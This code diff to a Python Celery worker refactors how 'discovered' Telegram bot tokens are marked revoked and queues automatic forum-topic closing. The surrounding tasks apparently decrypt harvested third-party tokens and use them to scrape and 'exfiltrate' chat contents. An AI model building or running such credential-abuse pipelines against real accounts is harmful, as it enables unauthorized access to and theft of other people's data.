@@ -470,6 +470,33 @@ def get_broadcaster():
         _broadcaster = BroadcasterService()
     return _broadcaster
 
+
+def _queue_revoked_topic_close(cred_id: str, reason: str) -> None:
+    if not getattr(settings, "AUTO_CLOSE_REVOKED_TOPICS", True):
+        return
+    try:
+        close_revoked_topics.apply_async(
+            kwargs={
+                "limit": 1,
+                "dry_run": False,
+                "credential_id": cred_id,
+                "reason": reason,
+            },
+            countdown=5,
+            queue="celery",
+        )
+    except Exception as exc:
+        logger.warning(f"[TopicClose] Could not queue revoked-topic close for {cred_id}: {exc}")
+
+
+async def _mark_credential_revoked(cred_id: str, reason: str) -> None:
+    await async_execute(
+        db.table("discovered_credentials")
+        .update({"status": "revoked"})
+        .eq("id", cred_id)
+    )
+    _queue_revoked_topic_close(cred_id, reason)
+
 @app.task(name="flow.exfiltrate_chat", soft_time_limit=2400, time_limit=2500)
 def exfiltrate_chat(cred_id: str):
     """
@@ -545,14 +572,14 @@ async def _exfiltrate_logic(cred_id: str):
     except Exception as e:
         # Invalid token or key mismatch
         logger.error(f"❌ [Exfil] Decryption failed for {cred_id}: {e}")
-        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
+        await _mark_credential_revoked(cred_id, "exfil_decryption_failed")
         return f"Decryption failed for {cred_id}: {e}"
 
     # Validate decrypted token format before use
     from app.utils.helpers import is_valid_telegram_token
     if not is_valid_telegram_token(bot_token):
         logger.error(f"❌ [Exfil] Decrypted token has invalid format for {cred_id}. Marking revoked.")
-        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
+        await _mark_credential_revoked(cred_id, "exfil_invalid_token_format")
         return f"Invalid token format after decryption for {cred_id}"
 
     # HTTP Preflight Check — verify token before heavy scrape
@@ -560,9 +587,7 @@ async def _exfiltrate_logic(cred_id: str):
         await scraper_service._probe_gateway_telemetry(encrypted_token, cred_id)
         updates, meta_info, is_revoked = await scraper_service._http_preflight_check(bot_token)
         if is_revoked:
-            await async_execute(
-                db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id)
-            )
+            await _mark_credential_revoked(cred_id, "exfil_preflight_revoked")
             return "Record inactive; marked revoked during preflight."
         if meta_info:
             await _merge_credential_meta(cred_id, meta_info)
@@ -627,7 +652,7 @@ async def _exfiltrate_logic(cred_id: str):
         )
         if permanent_errors:
             logger.error(f"❌ [Exfil] Permanent scraper failure for {cred_id}: {e}. Marking revoked.")
-            await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
+            await _mark_credential_revoked(cred_id, "exfil_permanent_scraper_failure")
         else:
             logger.warning(f"⚠️ [Exfil] Transient scraper failure for {cred_id}: {e}. Leaving status for retry.")
         return f"Scraping failed: {e}"
@@ -722,14 +747,14 @@ async def _enrich_logic(cred_id: str):
             bot_token = security.decrypt(record["bot_token"]).strip()
     except Exception as e:
         logger.error(f"❌ [Enrich] Decryption failed: {e}")
-        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
+        await _mark_credential_revoked(cred_id, "enrich_decryption_failed")
         return f"Decryption failed: {e}"
 
     # Validate decrypted token format before use
     from app.utils.helpers import is_valid_telegram_token
     if not is_valid_telegram_token(bot_token):
         logger.error(f"❌ [Enrich] Decrypted token has invalid format for {cred_id}. Marking revoked.")
-        await async_execute(db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id))
+        await _mark_credential_revoked(cred_id, "enrich_invalid_token_format")
         return f"Invalid token format after decryption for {cred_id}"
 
     # Discover
@@ -1276,13 +1301,25 @@ async def _retry_failed_broadcasts_logic(limit: int = 50) -> dict:
 
 
 @app.task(name="flow.close_revoked_topics")
-def close_revoked_topics(limit: int = 50, dry_run: bool = True):
-    """Close Telegram forum topics for revoked credentials. Dry-run by default."""
+def close_revoked_topics(
+    limit: int | None = None,
+    dry_run: bool = False,
+    credential_id: str | None = None,
+    reason: str | None = None,
+    force: bool = False,
+):
+    """Close Telegram forum topics for revoked credentials."""
     from app.workers.celery_app import get_worker_loop
     from app.services.topic_admin_srv import close_revoked_topics_logic
 
     return get_worker_loop().run_until_complete(
-        close_revoked_topics_logic(limit=limit, dry_run=dry_run)
+        close_revoked_topics_logic(
+            limit=limit or settings.REVOKED_TOPIC_CLOSE_BATCH_SIZE,
+            dry_run=dry_run,
+            credential_id=credential_id,
+            actor=f"celery_worker:{reason}" if reason else "celery_worker",
+            force=force,
+        )
     )
 
 
@@ -2537,11 +2574,7 @@ async def _reclassify_dark_matter_logic(max_credentials: int) -> dict:
             pass
     for cred_id in to_revoke:
         try:
-            await async_execute(
-                db.table("discovered_credentials")
-                .update({"status": "revoked"})
-                .eq("id", cred_id)
-            )
+            await _mark_credential_revoked(cred_id, "dark_matter_reclassify")
         except Exception:
             pass
 
